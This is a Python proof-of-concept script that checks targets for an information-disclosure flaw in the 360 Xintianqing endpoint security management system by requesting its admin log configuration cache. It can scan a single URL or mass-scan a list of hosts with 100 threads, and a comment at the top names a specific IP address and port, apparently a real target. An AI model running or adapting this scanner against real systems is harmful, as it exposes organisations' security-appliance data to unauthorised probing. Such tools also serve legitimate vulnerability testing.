#https://114.113.151.164:18443/
import argparse
import re
import requests
import sys
import os
import time

from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def poc(targer):
    url = targer+"/runtime/admin_log_conf.cache"

    res = requests.post(url = url,verify = False,timeout=5).text
    if "name" in res:
        print("存在存在存在漏洞！！！！！"+targer)
        return True
    else:
        print("不存在漏洞")
        return False






def banna():
    banna = """
             ▄▄▄▄    ▄▄▄       ███▄    █  ▄▄▄       ███▄    █  ▄▄▄     ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
    ▓█████▄ ▒████▄     ██ ▀█   █ ▒████▄     ██ ▀█   █ ▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
    ▒██▒ ▄██▒██  ▀█▄  ▓██  ▀█ ██▒▒██  ▀█▄  ▓██  ▀█ ██▒▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
    ▒██░█▀  ░██▄▄▄▄██ ▓██▒  ▐▌██▒░██▄▄▄▄██ ▓██▒  ▐▌██▒░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
    ░▓█  ▀█▓ ▓█   ▓██▒▒██░   ▓██░ ▓█   ▓██▒▒██░   ▓██░ ▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
    ░▒▓███▀▒ ▒▒   ▓▒█░░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ▒░   ▒ ▒  ▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
    ▒░▒   ░   ▒   ▒▒ ░░ ░░   ░ ▒░  ▒   ▒▒ ░░ ░░   ░ ▒░  ▒   ▒▒ ░   ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
     ░    ░   ░   ▒      ░   ░ ░   ░   ▒      ░   ░ ░   ░   ▒    ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
     ░            ░  ░         ░       ░  ░         ░       ░  ░            ░ ░      ░ ░      ░  ░
          ░                                                                                       

    """
    print(banna)


def main():
    banna()

    parser = argparse.ArgumentParser(description="360新天擎终端安全管理系统信息泄露漏洞")
    parser.add_argument("-u","--url",help="YOUR URL")
    parser.add_argument("-f","--file",help="YOUR FILE")

    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)

    elif not args.url and args.file:
        url_list = []
        with open(args.file,"r",encoding="utf-8") as  fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace("\n",""))

        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()

    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()